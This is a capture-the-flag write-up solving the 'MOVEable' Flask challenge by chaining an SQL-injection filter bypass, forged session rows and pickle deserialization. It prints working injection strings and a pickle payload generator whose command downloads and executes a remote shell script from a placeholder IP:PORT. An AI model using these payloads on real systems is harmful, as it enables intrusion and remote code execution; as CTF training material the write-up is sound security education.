---
title: MOVEable
author: Sir_X_
pubDate: 2024-10-17
toc: true
share: true
ogImage: true
---

# MOVEable
![](../../assets/dom-images/logo.jpg)

## Description
Author: @JohnHammond#6971

Ever wanted to move your files? You know, like with a fancy web based GUI instead of just FTP or something?

Well now you can, with our super secure app, MOVEable!

Escalate your privileges and find the flag.

## Solution
This challenge was quite fun to solve, with each step of exploitation becoming clear after a bit of searching. However, let's not rush things and rather examine how the challenge can be solved step by step.

We are provided with the app.py for a Flask application. This app displays a login page and utilizes an SQLlite database to store user information. Furthermore, there are tables for sessions and files that are stored within this web application.

The login function immediately reveals that the SQL statement for login seems susceptible to SQL injection. Below is the mentioned code segment:
```
username = DBClean(request.form['username'])
password = DBClean(request.form['password'])
conn = get_db()
c = conn.cursor()
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
c.executescript(sql)
```
However, before being used in the SQL statement, our parameters are "cleaned" in the `DBClean` function.
```
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```
The function removes the characters ` `, `'` and `"`. Yet, there is an additional replacement that substitutes `\` with `'`, implying that we can still use `'`, if we type `\` instead.

For bypassing the removal of the space character ` `, a simple bypass of `/**/` can be used. As a result, we can now execute almost any SQL command.
The remainder of the login function indicates that we need an existing user returned from the SQL statement for a successful login.
``` 
user = c.fetchone()
if user:
    c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
    active_session = c.fetchone()
    if active_session:
        session_id = active_session[0]
    else:
        c.execute(f"SELECT username FROM users WHERE username=?", (username,))
        user_name = c.fetchone()
        if user_name:
            session_id = str(uuid.uuid4())
            c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
        else:
            flash("A session could be not be created")
            return logout()
    
    session['username'] = username
    session['session_id'] = session_id
    conn.commit()
    return redirect(url_for('files'))
else:
    flash('Username or password is incorrect')
    return redirect(url_for('home'))
```
Given the ability to inject additional SQL commands, we can insert any user of our choosing into the users table. 
For example a user called `admin1` with the following statement:
```
admin1\;/**/INSERT/**/INTO/**/users/**/VALUES/**/(\admin1\,\admin1\)--
```
Even though our local setup confirms that this user is indeed created in the users table, we are still unable to log in. Debugging on the locally deployed web app of the MOVEable app.py reveals that the user variable remains persistently `None`. This is due to the app's utilization of `executescript()`, which returns nothing. Therefore we will never be able to login that way. 

Next, we need to explore alternative methods for authentication and exploitation of this web application. For this, we'll look at the remaining functions in the Python code.

There's a `download_file` function that allows us to download files. Interestingly, this route doesn't check our authentication credentials but fetches the session ID directly from the URL. It then verifies the existence of this session ID in the activesessions database table and proceeds to download the requested file. Below is the snippet of that function:
```
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    file_data = c.fetchone()
# Continued...
```
Given that we can insert any statement into the database, it's possible to craft ourselves a valid session ID. All we need to do is modify the SQL injection slightly so that it writes a session instead of a user:
```
admin1\;/**/INSERT/**/INTO/**/activesessions/**/VALUES/**/(\8de16447-c339-41c4-be6f-eaf3db51a661\,\admin1\,\2024-10-17 22:14:53.757220\);--
```
This will allow us to read the files stored in the database, including flag.txt, which unfortunately contains a dummy text instead of a flag:
> lol just kidding this isn't really where the flag is

This mock flag was expected, as it's also inserted into the db within the app.py code. One might hope that the actual live instance would provide the real flag, but that isn't the case. 

Next, looking further into the same function's code, we notice that `pickle` is utilized to load file content from base64.
```
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))
    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    try:    
        return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
    except TypeError:
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```
Google reveals that pickle has some serious vulnerabilities that we might exploit to execute commands on the server.

In Python, the pickle module is used to serialize and deserialize data. In this case, deserialization can also lead to remote code execution. More details can be found [here (Python-Pickle-RCE-Exploit)](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit/tree/main) and [here (exploiting-python-pickle)](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

Let's try to insert our own file into the third and last table of our database, one we haven't inserted anything into so far.

To generate the file content, we can use the following pickle payload generation script:
```
import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,('python3 -c "import urllib.request; exec(urllib.request.urlopen(\\"http://IP:PORT/shell.py\\").read())" IP PORT',))

payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
print(payload)
```
We then need to utilize the base64 output as file content in our insertion into the files table.
```
username=admin&password=admin\;INSERT/**/INTO/**/files/**/VALUES/**/(\pwned.txt\,\BASE64_HERE\,NULL)--%20-
```
The final step of the execution chain is to trigger the script. Of course, the `shell.py` needs to be downloadable by the hosted instance of the challenge, so the reverse shell can be downloaded from the Python script and executed. Moreover, the script then requires a way to connect back to your listener.

After the callback from the reverse shell, you were successfully able to access the root directory and read the flag. By using the command:
```
sudo cat /root/flag.txt
```

---
**Dombusters**: _Writeup written by Sir_X_
